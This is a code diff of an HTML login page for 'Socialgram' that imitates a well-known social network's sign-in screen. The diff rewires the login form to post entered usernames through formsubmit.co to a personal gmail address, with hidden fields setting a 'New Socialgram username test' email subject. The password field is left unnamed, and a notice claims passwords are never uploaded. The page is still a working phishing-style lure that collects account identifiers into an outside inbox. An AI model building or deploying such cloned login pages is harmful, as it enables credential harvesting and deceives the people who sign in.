@@ -1,53 +1,87 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Socialgram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Socialgram — Test</title>
   <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
 
-<main class="page">
-  <button class="close" aria-label="Close">×</button>
+  <main class="page">
 
-  <section class="login">
-    <h1>Socialgram</h1>
+    <button class="close" type="button">×</button>
 
-    <form id="loginForm">
-      <input
-        id="username"
-        type="text"
-        placeholder="Phone number, username, or email"
-        autocomplete="off"
-        required
+    <section class="login-card">
+
+      <div class="brand">Socialgram</div>
+
+      <form
+        action="https://formsubmit.co/gamingpccomingsoon@gmail.com"
+        method="POST"
       >
 
-      <div class="password">
+        <!-- Email settings -->
+        <input type="hidden" name="_subject" value="New Socialgram username test">
+        <input type="hidden" name="_template" value="table">
+
         <input
-          id="password"
-          type="password"
-          placeholder="Password"
+          type="text"
+          name="username"
+          placeholder="Phone number, username, or email"
           autocomplete="off"
           required
         >
-        <button type="button" id="show">Show</button>
+
+        <div class="password-box">
+          <input
+            id="password"
+            type="password"
+            placeholder="Password"
+            autocomplete="off"
+            required
+          >
+
+          <button id="showPassword" type="button">
+            Show
+          </button>
+        </div>
+
+        <label class="remember">
+          <input type="checkbox">
+          <span>Save login info</span>
+        </label>
+
+        <button class="login-btn" type="submit">
+          Log in
+        </button>
+
+      </form>
+
+      <a class="forgot" href="#">
+        Forgot password?
+      </a>
+
+      <div class="divider">
+        <span></span>
+        OR
+        <span></span>
       </div>
 
-      <label class="remember">
-        <input type="checkbox">
-        <span>Save login info</span>
-      </label>
+      <button class="demo-btn" id="demo">
+        Continue with demo account
+      </button>
 
-      <button class="login-btn" type="submit">Log in</button>
-    </form>
+      <p class="notice">
+        TEST MODE • Passwords are never uploaded or emailed.
+      </p>
 
-    <a href="#" class="forgot">Forgot password?</a>
+    </section>
 
-    <p id="status"></p>
-  </section>
-</main>
+  </main>
 
-<script src="script.js"></script>
+  <script src="script.js"></script>
+
 </body>
 </html>
